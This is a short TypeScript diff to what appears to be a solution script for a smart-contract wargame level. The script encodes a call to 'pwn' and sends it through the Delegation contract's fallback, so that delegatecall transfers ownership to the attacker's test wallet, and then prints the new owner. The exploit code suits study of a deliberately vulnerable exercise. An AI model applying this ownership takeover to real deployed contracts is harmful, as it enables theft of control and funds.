@@ -16,15 +16,19 @@ function toWei(eth: number) {
 
 async function main() {
   let alice = new Wallet(testPrivKey);
-  alice.connect(provider);
+  alice = alice.connect(provider);
   const inter = Delegate__factory.createInterface();
   const calldata = inter.encodeFunctionData("pwn")
+  console.log(calldata)
   
-
-  
-
+  const delegation = Delegation__factory.connect(addr, provider).connect(alice);
+  delegation.fallback({
+    data: calldata,
+    gasLimit: 1000000
+  }).then(async res => {
+    console.log(res)
+    console.log(await delegation.owner())
+  })
 }
 
-main().catch(e => {
-  console.log("Error: " + e)
-})
+main()
